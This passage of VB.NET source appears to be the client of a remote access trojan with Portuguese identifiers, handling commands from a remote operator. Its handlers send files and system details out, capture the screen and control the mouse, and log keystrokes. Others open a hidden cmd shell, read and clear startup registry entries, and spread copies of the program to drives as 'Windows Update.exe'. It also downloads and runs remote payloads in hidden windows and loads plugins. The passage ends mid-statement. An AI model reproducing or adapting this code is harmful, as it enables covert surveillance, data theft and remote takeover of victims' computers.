                    Application.DoEvents()
                    Dim SAStrRResult As String
                    Try
                        SAStrRResult += GetPastas("C:\Users\" & Environment.UserName & "\Videos")
                    Catch ex As Exception
                    End Try
                    Try
                        SAStrRResult += GetArquivos("C:\Users\" & Environment.UserName & "\Videos")
                    Catch ex As Exception
                    End Try
                    Send("EnviarResultadoGerenciadorrr" & Y & SAStrRResult & Y & "C:\Users\" & Environment.UserName & "\Videos" & Y)

                Case "|AtualizarG|"
                    Application.DoEvents()
                    Dim SAStrRResult As String
                    Try
                        SAStrRResult += GetPastas(A(1))
                    Catch ex As Exception
                    End Try
                    Try
                        SAStrRResult += GetArquivos(A(1))
                    Catch ex As Exception
                    End Try
                    Send("EnviarResultadoGerenciadorrr" & Y & SAStrRResult & Y & A(1) & Y)

                Case "|NavegarG|"
                    Application.DoEvents()
                    Dim SAStrRResult As String
                    Try
                        SAStrRResult += GetPastas(A(1))
                    Catch ex As Exception
                    End Try
                    Try
                        SAStrRResult += GetArquivos(A(1))
                    Catch ex As Exception
                    End Try

                    Send("EnviarResultadoGerenciadorrr" & Y & SAStrRResult & Y & A(1) & Y)

                Case "|InicializarG|"
                    Application.DoEvents()
                    Dim SAStrRResult As String
                    Try
                        SAStrRResult += GetPastas(Environment.GetFolderPath(Environment.SpecialFolder.Startup))
                    Catch ex As Exception
                    End Try
                    Try
                        SAStrRResult += GetArquivos(Environment.GetFolderPath(Environment.SpecialFolder.Startup))
                    Catch ex As Exception
                    End Try
                    Send("EnviarResultadoGerenciadorrr" & Y & SAStrRResult & Y & Environment.GetFolderPath(Environment.SpecialFolder.Startup) & Y)

                Case "|WindowsG|"
                    Application.DoEvents()
                    Dim SAStrRResult As String
                    Try
                        SAStrRResult += GetPastas("C:\Windows")
                    Catch ex As Exception
                    End Try
                    Try
                        SAStrRResult += GetArquivos("C:\Windows")
                    Catch ex As Exception
                    End Try
                    Send("EnviarResultadoGerenciadorrr" & Y & SAStrRResult & Y & "C:\Windows" & Y)

                Case "|SistemaG|"
                    Application.DoEvents()
                    Dim SAStrRResult As String
                    Try
                        SAStrRResult += GetPastas(Environment.GetFolderPath(Environment.SpecialFolder.System))
                    Catch ex As Exception
                    End Try
                    Try
                        SAStrRResult += GetArquivos(Environment.GetFolderPath(Environment.SpecialFolder.System))
                    Catch ex As Exception
                    End Try
                    Send("EnviarResultadoGerenciadorrr" & Y & SAStrRResult & Y & Environment.GetFolderPath(Environment.SpecialFolder.System) & Y)

                Case "|VisualizarG|"

                    Dim cM As Boolean = True
                    Dim buffer As Byte() = SB(Convert.ToBase64String(ZIP(File.ReadAllBytes(A(1)), cM)))
                    Dim stream As New MemoryStream
                    Dim s As String = ("ChamaFrmVisualizar" & Y)
                    stream.Write(SB(s), 0, s.Length)
                    stream.Write(buffer, 0, buffer.Length)

                    Send(stream.ToArray)

                Case "|RenomearPastaG|"

                    Try
                        My.Computer.FileSystem.RenameDirectory(A(1), A(2))
                    Catch ex As Exception

                    End Try

                Case "|RenomearArquivoG|"

                    Try
                        My.Computer.FileSystem.RenameFile(A(1), A(2))
                    Catch ex As Exception

                    End Try

                Case "|ExcluirPastaG|"

                    Try
                        Directory.Delete(A(1), True)
                    Catch ex As Exception

                    End Try

                Case "|ExcluirArquivoG|"

                    Try
                        File.Delete(A(1))
                    Catch ex As Exception

                    End Try

                Case "|BaixarArquivoG|"

                    Dim buffer As Byte() = SB(Convert.ToBase64String(ZIP(File.ReadAllBytes(A(1)), True)))
                    Dim stream As New MemoryStream
                    Dim s As String = ("EnviarBaixaArquivoG" & Y & MeuNome() & Y & Path.GetFileName(A(1)) & Y & My.Computer.FileSystem.GetFileInfo(A(1)).Length.ToString & Y & A(1) & Y)
                    stream.Write(SB(s), 0, s.Length)
                    stream.Write(buffer, 0, buffer.Length)

                    Send(stream.ToArray)

                Case "|EnviarArquivoMineG|"

                    Try
                        Dim by As Byte() = Nothing
                        by = ZIP(Convert.FromBase64String(A(3)), False)
                        Dim fn As String = A(1) & "\" & A(2)
                        File.WriteAllBytes(fn, by)
                    Catch ex As Exception

                    End Try

                    '========================================================================================================================================================================================























                Case "spreading"

                        Try
                            Dim allDrives() As DriveInfo = DriveInfo.GetDrives()
                            Dim d As DriveInfo
                            For Each d In allDrives
                                Application.DoEvents()
                                Thread.Sleep(10)
                                If d.IsReady = True Then
                                    If NomeSpreadDiscoLocal = Nothing Then
                                        File.Copy(Application.ExecutablePath, d.RootDirectory.FullName & "Windows Update.exe", True)
                                    Else
                                        File.Copy(Application.ExecutablePath, d.RootDirectory.FullName & NomeSpreadDiscoLocal, True)
                                    End If
                                End If
                            Next
                        Catch ex As Exception

                        End Try

                        'BARRA DE TAREFAS ON/OFF============================================================================================================================================================
                Case "EsconderBarraDeTarefas"

                        Dim intReturn As Integer = FindWindow("Shell_traywnd", "")
                        SetWindowPos(intReturn, 0, 0, 0, 0, 0, SWP_HIDEWINDOW)

                Case "MostrarBarraDeTarefas"

                        Dim intReturn As Integer = FindWindow("Shell_traywnd", "")
                        SetWindowPos(intReturn, 0, 0, 0, 0, 0, SWP_SHOWWINDOW)
                        '=======================================================================================================================================================================================



                        'MONITOR ON/OFF===========================================================================================================================================================
                Case "MonitorON"

                        SendMessage(-1, &H112, &HF170, -1)

                Case "MonitorOFF"

                        SendMessage(-1, &H112, &HF170, 2)
                        '============================================================================================================================================================================











                        'TERROR=======================================================================================================================================================

                Case "PermisaoFrmTerrror"

                        Send("ChamaFrmTerrorrr" & Y & Environment.MachineName & "/" & Environment.UserName & Y)

                Case "EnviarImagemTerrorrr"
                        Try
                            Dim by As Byte() = Nothing
                            by = ZIP(Convert.FromBase64String(A(2)), False)
                            Dim fn As String = Environ("temp") & "\" & RN(10) & A(1)
                            IO.File.WriteAllBytes(fn, by)
                            Dim NoB As New FrmSustos
                            NoB.PictureBox1.Image = Image.FromFile(fn)
                            NoB.Show()
                        Catch ex As Exception

                        End Try

                        '============================================================================================================================================================================










































                        'REMOTE DESKTOP=======================================================================================================================================
                Case "EnviarDesktooopp" ' server ask for my screen Size

                        cap.Clear()
                        Dim s = Screen.PrimaryScreen.Bounds.Size
                        Send("ChamaFormDesktop" & Y & s.Width & Y & s.Height & Y & Environment.UserName & "/" & Environment.MachineName & Y)

                Case "Meu@" ' Start Capture

                        Dim SizeOfimage As Integer = A(1)
                        Dim Split As Integer = A(2)
                        Dim Quality As Integer = A(3)

                        Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
                        Dim M As New IO.MemoryStream
                        Dim CMD As String = "Meu@" & Y
                        M.Write(SB(CMD), 0, CMD.Length)
                        M.Write(Bb, 0, Bb.Length)
                        Send(M.ToArray)
                        M.Dispose()

                Case "@@" ' Start Capture

                        Dim SizeOfimage As Integer = A(1)
                        Dim Split As Integer = A(2)
                        Dim Quality As Integer = A(3)
                        Dim Bb As Byte() = caa.Cap(SizeOfimage, Split, Quality)
                        Dim M As New IO.MemoryStream
                        Dim CMD As String = "@@" & Y
                        M.Write(SB(CMD), 0, CMD.Length)
                        M.Write(Bb, 0, Bb.Length)
                        Send(M.ToArray)
                        M.Dispose()

                Case "EnviarClickMauser" ' mouse clicks

                        Cursor.Position = New Point(A(1), A(2))
                        CRDP1.mouse_event(A(3), 0, 0, 0, 1)

                Case "EnviarMauserMove" '  mouse move

                        Cursor.Position = New Point(A(1), A(2))

                        '=========================================================================================================================================


















                        'GERENCIADOR DE TAREFAS===========================================================================================================================
                Case "EnviarPermisaoGerenciador"

                        Send("ChamaFormGerenciadorTareefeas" & Y & Environment.MachineName & "/" & Environment.UserName & Y)

                Case "PegarProcessos"

                        Dim allProcess As String = ""
                        Dim sl As String = "ProcessSplit"
                        For Each xd As Process In Process.GetProcesses
                            Try
                                allProcess += xd.ProcessName & "|" & xd.Id & "|" & xd.MainModule.FileName & "|" & xd.PrivateMemorySize64 & "|" & xd.StartTime & sl
                            Catch
                                allProcess += xd.ProcessName & "|" & xd.Id & "|" & "-" & "|" & xd.PrivateMemorySize64 & "|" & "-" & sl
                            End Try
                        Next

                        Send("ChamaListProcesss" & Y & allProcess & Y & Process.GetCurrentProcess().Id.ToString & Y)

                Case "FinalizarProcesss"

                        Try
                            For Each N In Process.GetProcessesByName(A(1))
                                N.Kill()
                            Next
                        Catch ex As Exception

                        End Try

                Case "ResumerrProcesss"

                        Try
                            NtResumeProcess(Process.GetProcessById(A(1)).Handle)
                        Catch ex As Exception

                        End Try

                Case "SuspenderProcesss"

                        Try
                            NtSuspendProcess(Process.GetProcessById(A(1)).Handle)
                        Catch ex As Exception

                        End Try

                Case "RestarttProcesss"

                        Try
                            Dim protxt As New TextBox
                            protxt.Text = A(1) 'DIRETORIO
                            Process.GetProcessById(A(2)).Kill() 'ID
                            Process.Start(protxt.Text) 'EXECUTAR
                        Catch ex As Exception

                        End Try

                        '=========================================================================================================================================================
























                        'STARTUP============================================================================================================================================================

                Case "PermisaoStartUpp"

                        Send("ChamaFrmStartUpsss" & Y & Environment.MachineName & "/" & Environment.UserName & Y)

                Case "EnviarStartupsssa"

                        Application.DoEvents()
                        Dim SaveStrResult As String
                        'CURRENT_USER
                        Try
                            Dim DestKey As String = "Software\Microsoft\Windows\CurrentVersion\Run\"
                            For Each App As String In Registry.CurrentUser.OpenSubKey(DestKey).GetValueNames
                                SaveStrResult += "%CU_RUN%" & ".|." & App & ".|." & Registry.CurrentUser.OpenSubKey(DestKey).GetValue(App) & ".|." & vbNewLine
                            Next
                        Catch ex As Exception

                        End Try

                        Try
                            Dim DestKey As String = "Software\Microsoft\Windows\CurrentVersion\RunOnce\"
                            For Each App As String In Registry.CurrentUser.OpenSubKey(DestKey).GetValueNames
                                SaveStrResult += "%CU_ONCE%" & ".|." & App & ".|." & Registry.CurrentUser.OpenSubKey(DestKey).GetValue(App) & ".|." & vbNewLine
                            Next
                        Catch ex As Exception

                        End Try

                        Try
                            Dim DestKey As String = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"
                            For Each App As String In Registry.CurrentUser.OpenSubKey(DestKey).GetValueNames
                                SaveStrResult += "%CU_EXPLO%" & ".|." & App & ".|." & Registry.CurrentUser.OpenSubKey(DestKey).GetValue(App) & ".|." & vbNewLine
                            Next
                        Catch ex As Exception

                        End Try
                        'LOCAL_MACHINE
                        Try
                            Dim DestKey As String = "Software\Microsoft\Windows\CurrentVersion\Run\"
                            For Each App As String In Registry.LocalMachine.OpenSubKey(DestKey).GetValueNames
                                SaveStrResult += "%MA_RUN%" & ".|." & App & ".|." & Registry.LocalMachine.OpenSubKey(DestKey).GetValue(App) & ".|." & vbNewLine
                            Next
                        Catch ex As Exception

                        End Try

                        Try
                            Dim DestKey As String = "Software\Microsoft\Windows\CurrentVersion\RunOnce\"
                            For Each App As String In Registry.LocalMachine.OpenSubKey(DestKey).GetValueNames
                                SaveStrResult += "%MA_ONCE%" & ".|." & App & ".|." & Registry.LocalMachine.OpenSubKey(DestKey).GetValue(App) & ".|." & vbNewLine
                            Next
                        Catch ex As Exception

                        End Try

                        Try
                            Dim DestKey As String = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\"
                            For Each App As String In Registry.LocalMachine.OpenSubKey(DestKey).GetValueNames
                                SaveStrResult += "%MA_EXPLO%" & ".|." & App & ".|." & Registry.LocalMachine.OpenSubKey(DestKey).GetValue(App) & ".|." & vbNewLine
                            Next
                        Catch ex As Exception

                        End Try

                        Try
                            For Each Dir As String In Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup))
                                SaveStrResult += "%FOLD_UP%" & ".|." & Path.GetFileName(Dir) & ".|." & SetBytes(Dir.Length) & ".|." & vbNewLine
                            Next
                        Catch ex As Exception

                        End Try

                        Send("EnviarStartupDadoss" & Y & SaveStrResult & Y)

                Case "ExcluirKeyyy"

                        Dim kk As Object = GetKey(A(1))
                        kk.DeleteValue(A(2), False)

                Case "ExcluirArquivoStartUp"

                        Try
                            Dim N As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
                            File.Delete(N & "\" & A(1))
                        Catch ex As Exception

                        End Try

                        '============================================================================================================================================================
































































                        'MENSAGEM================================================================================================================================================

                Case "EnviarPermisaaaoMensagem"

                        Send("ChamaFrmMensagemms" & Y & Environment.MachineName & "/" & Environment.UserName & Y)

                Case "EnviarMensagemFakker"
                        Dim messageicon As MessageBoxIcon
                        Dim messagebutton As MessageBoxButtons
                        Select Case A(1)
                            Case "1"
                                messageicon = MessageBoxIcon.Information
                            Case "2"
                                messageicon = MessageBoxIcon.Question
                            Case "3"
                                messageicon = MessageBoxIcon.Warning
                            Case "4"
                                messageicon = MessageBoxIcon.Error
                        End Select
                        Select Case A(2)
                            Case "1"
                                messagebutton = MessageBoxButtons.YesNo
                            Case "2"
                                messagebutton = MessageBoxButtons.YesNoCancel
                            Case "3"
                                messagebutton = MessageBoxButtons.OK
                            Case "4"
                                messagebutton = MessageBoxButtons.OKCancel
                            Case "5"
                                messagebutton = MessageBoxButtons.RetryCancel
                            Case "6"
                                messagebutton = MessageBoxButtons.AbortRetryIgnore
                        End Select
                        MessageBox.Show(A(4), A(3), messagebutton, messageicon)

                        '==============================================================================================================================================================================================















































                        'CONEXÕES TCP===================================================================================================================================================

                Case "Permisaoconesaosss"

                        Send("ChamaFrmConexaoo" & Y & Environment.MachineName & "/" & Environment.UserName & Y)

                Case "EnviarConxaoooodd"

                        Try
                            Dim strNo As String = String.Empty
                            Dim Coone As IPGlobalProperties = IPGlobalProperties.GetIPGlobalProperties()
                            Dim a00() As TcpConnectionInformation = Coone.GetActiveTcpConnections()
                            For Each RrX As TcpConnectionInformation In a00
                                strNo += String.Format("{0}|{1}|{2}", RrX.LocalEndPoint, RrX.RemoteEndPoint, RrX.State) & vbCrLf
                            Next

                            Send("EnviarDadosConexaooo" & Y & strNo.Trim & Y)
                        Catch ex As Exception

                        End Try

                        '==========================================================================================================================================================

















                        'GERENCIADOR DE SERVIÇOS=========================================================================================================================================

                Case "PermisaopServiços"

                        Send("ChamaFrmServiçosS" & Y & Environment.MachineName & "/" & Environment.UserName & Y)

                Case "EnviarDadosssServiços"

                        Try
                            Dim DefinStr() As ServiceController = ServiceController.GetServices()
                            Dim ListvSt As New ListView
                            For Boogt As Integer = 0 To UBound(DefinStr)
                                With ListvSt.Items.Add(DefinStr(Boogt).ServiceName)
                                    .SubItems.Add(DefinStr(Boogt).DisplayName)
                                    .SubItems.Add(DefinStr(Boogt).ServiceType.ToString)
                                    .SubItems.Add(DefinStr(Boogt).Status.ToString)
                                End With
                            Next
                            Dim StrResult As String = ""
                            For Each LoopResult As ListViewItem In ListvSt.Items
                                StrResult = StrResult & LoopResult.Text & "|" & LoopResult.SubItems(1).Text & "|" & LoopResult.SubItems(2).Text & "|" & LoopResult.SubItems(3).Text & vbNewLine
                            Next
                            StrResult = StrResult.Trim

                            Send("EnviarDadosServiçoss" & Y & StrResult & Y)
                        Catch ex As Exception

                        End Try

                Case "FinalizarServicoss"

                        Try
                            Dim StrSerr() As ServiceController = ServiceController.GetServices()
                            StrSerr(A(1)).Close()
                        Catch ex As Exception

                        End Try

                Case "ContinuarServicesss"

                        Try
                            Dim StrProo() As ServiceController = ServiceController.GetServices()
                            StrProo(A(1)).Continue()
                        Catch ex As Exception

                        End Try

                Case "PausarrServicesss"

                        Try
                            Dim StrProo() As ServiceController = ServiceController.GetServices()
                            StrProo(A(1)).Pause()
                        Catch ex As Exception

                        End Try


                Case "IniciarrServicesss"

                        Try
                            Dim StrProo() As ServiceController = ServiceController.GetServices()
                            StrProo(A(1)).Start()
                        Catch ex As Exception

                        End Try

                Case "PararrServicesss"

                        Try
                            Dim StrProo() As ServiceController = ServiceController.GetServices()
                            StrProo(A(1)).Stop()
                        Catch ex As Exception

                        End Try

                Case "AtualizarrServicesss"

                        Try
                            Dim StrProo() As ServiceController = ServiceController.GetServices()
                            StrProo(A(1)).Refresh()
                        Catch ex As Exception

                        End Try


                Case "ExecutarComandoServicess"

                        Try
                            Dim StrResullt() As ServiceController = ServiceController.GetServices()
                            StrResullt(A(1)).ExecuteCommand(A(2))
                        Catch ex As Exception

                        End Try

                        '=============================================================================================================================================================================================================================
































                        'WALLPAPER=======================================================================================================================================================================
                Case "TrocaaWallpaper"

                        Dim by As Byte() = Nothing
                        If A(2).ToLower.StartsWith("http") = False Then
                            by = ZIP(Convert.FromBase64String(A(2)), False)
                        Else
                            Dim w As Object = New Net.WebClient
                            by = w.DownloadData(A(2))
                        End If
                        Send("bla")
                        Dim fn As String = Environ("temp") & "\" & RN(10) & "." & A(1)
                        IO.File.WriteAllBytes(fn, by)
                        Try
                            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, fn, SPIF_UPDATEINIFILE)
                        Catch ex As Exception

                        End Try
                        '==================================================================================================================================================================================================












                        'SKYPE=================================================================================================================================================================================
                Case "PermisaoSkypeForm"

                        Send("ChamaFormSkypeee" & Y & MeuNome())

                Case "|PIniciarSkyppee|"

                Case "|PFecharSkyppee|"

                        '=================================================================================================================================================================================================================
























                        'CLIPBOARD========================================================================================================================================================

                Case "EnviarServidorChamaFormClipboard"

                        Send("FormClipboard" & Y & Environment.UserName & "/" & Environment.MachineName & Y)

                Case "MeuTextoClipboard"

                        Send("TextoClipboard" & Y & My.Computer.Clipboard.GetText().ToString() & Y)

                Case "NovoClipboard"

                        Clipboard.SetText(A(1))

                Case "ExcluirClipboard"

                        Clipboard.Clear()

                        '==========================================================================================================================================================================================================















                        'PROGRAMA INSTALADOS=====================================================================================================================================================================
                Case "PrimsaoFormProgramas"

                        Send("ChamaFormProgramas" & Y & Environment.MachineName & "/" & Environment.UserName & Y)

                Case "EnviarListaProgramas"

                        Try
                            Dim StRResultado As String
                            Dim MinhaKey As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\"
                            For Each App As String In Registry.LocalMachine.OpenSubKey(MinhaKey).GetSubKeyNames
                                StRResultado += Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\" & App & "\", "DisplayName", "N/A") & "%|%" & vbNewLine
                            Next
                            Send("LiiiistaProgramas" & Y & StRResultado & Y)
                        Catch ex As Exception

                        End Try

                Case "DesinsTalarProgramass"

                        Try
                            Dim A1, A2 As Microsoft.Win32.RegistryKey
                            Dim A2A As String
                            Dim A2AA As String = "Software\Microsoft\Windows\CurrentVersion\Uninstall"
                            Dim A2AAA As String = String.Empty
                            A1 = My.Computer.Registry.LocalMachine.OpenSubKey(A2AA)
                            Dim EEA() As String = A1.GetSubKeyNames
                            For Each EE As String In EEA
                                A2 = A1.OpenSubKey(EE)
                                A2A = A2.GetValue("DisplayName", "")
                                If A2A = A(1) Then
                                    Process.Start(A2.GetValue("UninstallString", ""))
                                End If
                            Next
                        Catch ex As Exception

                        End Try

                        '=============================================================================================================================================







































                        'GERENCIADOR DE JANELAS===============================================================================================================================
                Case "PermisaoGJanelas"

                        Send("EnviarPermitirForm" & Y & Environment.MachineName & "/" & Environment.UserName & Y)

                Case "EnviarJanelasFf"


                        Dim StrResultado As String = ""

                        For Each bg In Process.GetProcesses(".")
                            Try
                                If bg.MainWindowTitle.Length > 0 Then
                                    StrResultado += bg.MainWindowTitle & "%|%" & bg.Handle.ToString & "%|%" & vbNewLine
                                End If
                            Catch
                            End Try
                        Next

                        Send("EnviarPermitirFormJanelas" & Y & StrResultado & Y)

                        '============================================================================================================================================================




















                        'CMD===================================================================================================================================================================
                Case "rss"

                        Try
                            Pro.Kill()
                        Catch ex As Exception

                        End Try

                        Pro = New Process
                        Pro.StartInfo.RedirectStandardOutput = True
                        Pro.StartInfo.RedirectStandardInput = True
                        Pro.StartInfo.RedirectStandardError = True
                        Pro.StartInfo.FileName = "cmd.exe"
                        Pro.StartInfo.RedirectStandardError = True
                        AddHandler CType(Pro, Process).OutputDataReceived, AddressOf RS
                        AddHandler CType(Pro, Process).ErrorDataReceived, AddressOf RS
                        AddHandler CType(Pro, Process).Exited, AddressOf ex
                        Pro.StartInfo.UseShellExecute = False
                        Pro.StartInfo.CreateNoWindow = True
                        Pro.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                        Pro.EnableRaisingEvents = True
                        Send("rss")
                        Pro.Start()
                        Pro.BeginErrorReadLine()
                        Pro.BeginOutputReadLine()

                Case "rs"

                        Pro.StandardInput.WriteLine(DEB(A(1)))

                Case "rsc"

                        Try
                            Pro.Kill()
                        Catch ex As Exception

                        End Try

                        Pro = Nothing
                        '===================================================================================================================================================================================================







                        'KEYLOGGER==================================================================================================================================================================================
                Case "kl"

                        Send("kl" & Y & ENB(kq.Logs))

                Case "ExcluirKeyllogger"

                        Try
                            If File.Exists(Application.StartupPath & "\" & EXE & ".tmp") Then
                                File.Delete(Application.StartupPath & "\" & EXE & ".tmp")
                            End If
                            kq.Logs = "Nenhum Keylogger..."
                        Catch ex As Exception

                        End Try
                        '===========================================================================================================================================================================================================




                        'MINE INFORMAÇÕES DO SERVIDOR==============================================================================================================================================================================================
                Case "inf"

                        Try

                            Dim NomeMyProcessador As String
                            NomeMyProcessador = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", "")

                            Dim x As String = "inf" & Y

                            Dim strHostName As String
                            Dim strIPAddress As String
                            strHostName = Environment.MachineName
                            strIPAddress = System.Net.Dns.GetHostByName(strHostName).AddressList(0).ToString()

                            x &= ENB(strIPAddress) & Y & _
                            country & Y & _
                            F.Info.OSFullName & " " & Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE").ToString & Y & _
                            Environment.MachineName & "/" & Environment.UserName & Y & _
                            SetBytes(My.Computer.Info.TotalPhysicalMemory) & Y & _
                            ListHosts & Y & _
                            ListPortas & Y & _
                            DR & Y & _
                            EXE & Y & _
                            DataDeInstalacao() & Y & _
                            NomeMyProcessador & Y

                            Send(x)

                        Catch ex As Exception

                        End Try
                        '==========================================================================================================================================================================================================================

















                        'INFORMAÇÕES========================================================================================================================================================================================================================
                Case "EnviarPermisaoDeInfomacaoParaServidor"

                        Send("ChamaFormInformacao" & Y & Environment.UserName & "/" & Environment.MachineName & Y)

                Case "TextoInformacoes"

                        Try

                            Application.DoEvents()

                            Dim Localização As String = Application.ExecutablePath & Y

                            Dim Atributos As String = File.GetAttributes(Application.ExecutablePath).ToString & Y

                            Dim Diretório As String = DR & Y 'TIRAR AS ASPAS

                            Dim Portas As String = ListPortas & Y 'TIRAR AS ASPAS

                            Dim Hosts As String = ListHosts & Y 'TIRAR AS ASPAS

                            Dim Servidores As String = EXE & Y 'TIRAR AS ASPAS

                            Dim DataInstalação As String = DataDeInstalacao() & Y 'TIRAR AS ASPAS

                            '=============================================================================

                            Dim IPV4 As String = Dns.GetHostByName(System.Net.Dns.GetHostName()).AddressList(0).ToString() & Y

                            Dim IPLocal As String = "127.0.0.1" & Y

                            Dim EndereçoMAC As String = NetworkInterface.GetAllNetworkInterfaces()(0).GetPhysicalAddress().ToString & Y

                            '=============================================================================

                            Dim NomeDoComputador As String = SystemInformation.ComputerName & Y

                            Dim NomeDoDomino As String = SystemInformation.UserDomainName & Y

                            Dim NomeDoUsuário As String = SystemInformation.UserName & Y

                            Dim Monitores As String = SystemInformation.MonitorCount.ToString() & Y

                            Dim Resolução As String = SystemInformation.VirtualScreen.Width.ToString() & "x" & SystemInformation.VirtualScreen.Height.ToString() & Y

                            Dim SistemaOpracional As String = My.Computer.Info.OSFullName & Y

                            Dim PlataformaDoSistema As String = My.Computer.Info.OSPlatform & Y

                            Dim VersãoDoSistema As String = My.Computer.Info.OSVersion & Y

                            Dim TamanhoDaRAM As String = SetBytes(My.Computer.Info.TotalPhysicalMemory) & Y

                            Dim Bateria As String = SystemInformation.PowerStatus.BatteryChargeStatus.ToString & " (" & SystemInformation.PowerStatus.BatteryLifePercent * 100 & "%)" & Y

                            Dim InformaçõesCPU As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", "N/A") & Y

                            Dim InformaçõesGPU As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winsat", "PrimaryAdapterString", "N/A") & Y

                            Dim UpTimes As String = String.Empty
                            UpTimes += Math.Round(Environment.TickCount / 86400000) & " Dias, "
                            UpTimes += Math.Round(Environment.TickCount / 3600000 Mod 24) & " Horas, "
                            UpTimes += Math.Round(Environment.TickCount / 120000 Mod 60) & " Minutos, "
                            UpTimes += Math.Round(Environment.TickCount / 1000 Mod 60) & " Segundos." & Y

                            Dim Indentificador As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "Identifier", "N/A") & Y

                            Dim DataHoras As String = My.Computer.Clock.LocalTime & Y

                            Dim WebCam As String
                            If Cam() = "True" Then
                                WebCam = "Sim" & Y
                            Else
                                WebCam = "Não" & Y
                            End If

                            Dim Janelas As String = DEB(ACT()) & Y 'TIRAR AS ASPAS

                            Dim PastaDoSistema As String = Environment.SystemDirectory & Y

                            Dim Idioma As String = My.Computer.Info.InstalledUICulture.ToString & Y

                            Dim País As String = country & Y 'TIRAR AS ASPAS

                            Dim TipoDeSistema As String = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE").ToString & "-based PC" & Y

                            Dim ModeloDoSistema As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "SystemProductName", "N/A") & Y

                            Dim VersãoDataDaBIOS As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSVendor", "N/A") & " " & My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSVersion", "N/A") & ", " & My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSReleaseDate", "N/A") & Y

                            '================================================================================================================================================================

                            Dim ProprietarioRegistrado As String = Environment.UserName & Y

                            Dim OrganizaçãoRegistrada As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "RegisteredOrganization", "N/A") & Y

                            Dim ChaveDoProduto As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductId", "N/A") & Y

                            '   GetAntiVirus() & Y

                            Dim Firewal As String = My.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile", "EnableFirewall", "N/A")
                            If Firewal = "0" Then
                                Firewal = "Desativado" & Y
                            Else
                                Firewal = "Ativado" & Y
                            End If

                            Send("EnviaResultadoInformacoes" & Y & Localização & Atributos & Diretório & Portas & Hosts & Servidores & DataInstalação & IPV4 & IPLocal & EndereçoMAC & NomeDoComputador & NomeDoDomino & NomeDoUsuário & Monitores & Resolução & SistemaOpracional & PlataformaDoSistema & VersãoDoSistema & TamanhoDaRAM & Bateria & InformaçõesCPU & InformaçõesGPU & UpTimes & Indentificador & DataHoras & WebCam & Janelas & PastaDoSistema & Idioma & País & TipoDeSistema & ModeloDoSistema & VersãoDataDaBIOS & ProprietarioRegistrado & OrganizaçãoRegistrada & ChaveDoProduto & GetAntiVirus() & Firewal & Y)
                        Catch ex As Exception

                        End Try

                        '================================================================================================================================================================================================================














                Case "rn"

                        Dim by As Byte() = Nothing
                        If A(2).ToLower.StartsWith("http") = False Then
                            by = ZIP(Convert.FromBase64String(A(2)), False)
                        Else
                            Dim w As Object = New Net.WebClient
                            by = w.DownloadData(A(2))
                        End If
                        Send("bla")
                        Dim fn As String = Environ("temp") & "\" & RN(10) & "." & A(1)
                        IO.File.WriteAllBytes(fn, by)
                        Process.Start(fn)





                Case "ExecutarInvisivel"

                        Dim by As Byte() = Nothing
                        If A(2).ToLower.StartsWith("http") = False Then
                            by = ZIP(Convert.FromBase64String(A(2)), False)
                        Else
                            Dim w As Object = New Net.WebClient
                            by = w.DownloadData(A(2))
                        End If
                        Send("bla")
                        Dim fn As String = Environ("temp") & "\" & RN(10) & "." & A(1)
                        IO.File.WriteAllBytes(fn, by)

                        Dim startInfo As New ProcessStartInfo(fn)
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden
                        Process.Start(startInfo)

                Case "inv"

                        Send("bla")
                        Dim S As String = GTV(A(1))
                        Dim by As Byte()
                        If S.Length > 0 Then
                            by = Convert.FromBase64String(S)
                            Send("pl" & Y & A(1) & Y & 0)
                        Else
                            If A(3).Length = 1 Then
                                Send("pl" & Y & A(1) & Y & "False")
                                Exit Sub
                            End If
                            by = ZIP(Convert.FromBase64String(A(3)), False)
                            If STV(A(1), Convert.ToBase64String(by)) Then
                                Send("pl" & Y & A(1) & Y & 0)
                            End If
                        End If
                        Dim obj As Object = Plugin(by, "A")
                        obj.h = ListHosts
                        obj.p = ListPortas
                        obj.osk = A(2)
                        obj.start()
                        Do Until Cn = False Or obj.Off = True
                            Thread.Sleep(1)
                        Loop
                        obj.off = True

                Case "ret" ' invoke and return

                        Send("bla")
                        Dim S As String = GTV(A(1))
                        Dim by As Byte()
                        If S.Length > 0 Then
                            by = Convert.FromBase64String(S)
                            Send("pl" & Y & A(1) & Y & 0)
                        Else
                            If A(2).Length = 1 Then
                                Send("pl" & Y & A(1) & Y & "True")
                                Exit Sub
                            End If
                            by = ZIP(Convert.FromBase64String(A(2)), False)
                            If STV(A(1), Convert.ToBase64String(by)) Then
